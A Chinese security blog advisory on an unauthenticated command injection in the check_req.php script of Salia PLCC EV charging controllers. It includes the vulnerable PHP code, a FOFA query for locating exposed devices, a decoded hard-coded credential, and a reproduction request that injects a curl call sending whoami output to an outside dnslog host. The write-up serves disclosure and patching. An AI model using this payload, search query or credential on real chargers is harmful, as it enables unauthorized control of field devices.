---
title: "Salia PLCC check_req.php 命令执行漏洞"
source: https://mrxn.net/jswz/salia-check_req-ntp-rce.html
asset_dir: assets/salia-plcc-check_req.php-命令执行漏洞
---

# Salia PLCC check\_req.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/22 08:19
- 978浏览
- [0评论](#comment)
- 22分钟阅读

---

# 漏洞简介

Salia PLCC 的 eCHARGE 系列提供适用于家庭、企业和公共场所的智能电动汽车充电解决方案，具备高效充电、动态负载管理和光伏系统集成等功能的充电站。其充电管理系统 `check_req.php` 存在命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，未授权攻击者可利用该漏洞在设备上[执行任意系统命令](https://mrxn.net/tag/rce)。

# 影响版本

<2.0.4 版本

# fofa语法

> `"Salia PLCC"`

# 漏洞分析

看下 `check_req.php` 的业务逻辑实现，如下

```
<?php
    //sleep(2);

    $final = array();
    $final["status"] = "pending";

    $x = $_GET;
    if (array_key_exists("ntp", $x)) {
       $cmd = '/srv/salia/nwcheck -ntpx='.$x['ntp'];
       exec($cmd, $output, $result_code);
       $final["result"] = $output;
       $final["code"] = $result_code;
       if ($result_code==0) { $final["result"] = "Ok"; }
       else {
          $cmd2 = '/srv/salia/nwcheck -ntp='.$x['ntp'];
          exec($cmd2, $output2, $result_code2);
          $final["result"] = $output2;
       }
       $final["status"] = "ok";
    }
    if (array_key_exists("portal", $x)) {
       $url = 'https://saliaportal.echarge.de/reachable.php';
       $qry = array();
       $data = http_build_query($qry);
       $opts = array(
             'http' => array(
                   'method'  => 'GET',
                   'header'  => "Content-type: application/x-www-form-urlencoded\r\n".
                             "Authorization: Basic c2FsaWE6eDlUZzI3JDNfJTQ0bkJkP2dG\n",
                   'timeout' => 4
             ),
             'ssl' => array(
                   'verify_peer' => false,
                   'verify_peer_name' => false
             )
       );
       $context = stream_context_create($opts);
       $ret = file_get_contents($url, false, $context);
       $final["result"] = $ret;
       $final["code"] = 0;
       $final["status"] = "ok";
    }

    echo json_encode($final);
    // TODO -> return state of nwcheck ...

?>
```

在处理`ntp`参数时，用户输入直接拼接到系统命令中，未经过滤或转义。攻击者可通过构造恶意参数[执行任意系统命令](https://mrxn.net/tag/rce)。

污点参数传递路径如下

```
$_GET['ntp']` → `$cmd = '/srv/salia/nwcheck -ntpx='.$x['ntp'];` → `exec($cmd, ...)
```

其中还存在一个默认硬编码凭证

```
c2FsaWE6eDlUZzI3JDNfJTQ0bkJkP2dG` ==> `salia:x9Tg27$3_%44nBd?gF
```

修复版本(2.2.0)增加了 `escapeshellarg` 函数进行过滤

[![Salia PLCC check_req.php 命令执行漏洞](images/img-001-fa4e25a6bdd8.webp)](https://image.mrxn.net/c17b9704cfbe41af9a5ecd36d012d20b.webp)

# 漏洞复现

```
GET /check_req.php?ntp=127.0.0.1;curl+`whoami`.dnslog.pt HTTP/1.1
Host: salia.mrxn.net
```

成功获得 `whoami` 命令执行结果

[![Salia PLCC check_req.php 命令执行漏洞](images/img-002-7a037556289a.webp)](https://image.mrxn.net/d3eb2e0da6044182aee6d85e6ef1bed1.webp)

# 参考

- `https://www.onekey.com/resource/critical-vulnerabilities-in-ev-charging-stations-analysis-of-echarge-controllers`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
